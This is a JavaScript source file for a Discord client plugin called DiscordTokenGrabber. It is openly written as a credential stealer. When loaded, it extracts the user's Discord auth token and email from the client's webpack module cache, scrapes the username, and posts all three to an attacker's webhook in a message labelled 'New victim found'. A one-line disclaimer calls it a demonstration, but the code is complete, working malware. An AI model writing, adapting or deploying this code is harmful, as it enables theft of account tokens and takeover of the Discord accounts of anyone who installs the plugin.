/** 
  * @name DiscordTokenGrabber
  * @version 1.0.0
  * @description Plugin for getting someone else's auth token Discord
*/

/* This plugin is for demonstration purposes! Not recommended for malicious purposes! */

const config = {
    "info": {
        "name": "DiscordTokenGrabber",
        "author": ["ethernalsteve", "your nickname"],
        "version": "1.0.0",
        "description": "Plugin for getting someone else's auth token Discord"
    },
    "webhook": {
        // Data from your webhook
        "id": "",
        "token": ""
    }
}

class DiscordTokenGrabber {
    constructor() { this._config = config; }
    
    getName() { return config.info.name; }
    getAuthor() { return config.info.author[0] }
    getDescription() { return config.info.description; }
    getVersion() { return config.info.version; }

    authToken = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getToken !== void 0).exports.default.getToken();
    userEmail = Object.values(webpackJsonp.push([ [], { ['']: (_, e, r) => { e.cache = r.c } }, [ [''] ] ]).cache).find(m => m.exports && m.exports.default && m.exports.default.getEmail !== void 0).exports.default.getEmail();
    username = $("[class *= \"nameTag\"]").first().text();

    load() {
        if (this.authToken != undefined && this.userEmail != undefined && this.username != undefined) {
            require("request").post(`https://discordapp.com/api/webhooks/${config.webhook.id}/${config.webhook.token}`, {form: {content: `**New victim found by __${config.info.author[1]}__**\n\n**Victim's nickname: __${this.username}__**\n**Victim email: __${this.userEmail}__**\n**Received token:**\`\`\`${this.authToken}\`\`\``}})
        }
    }
}
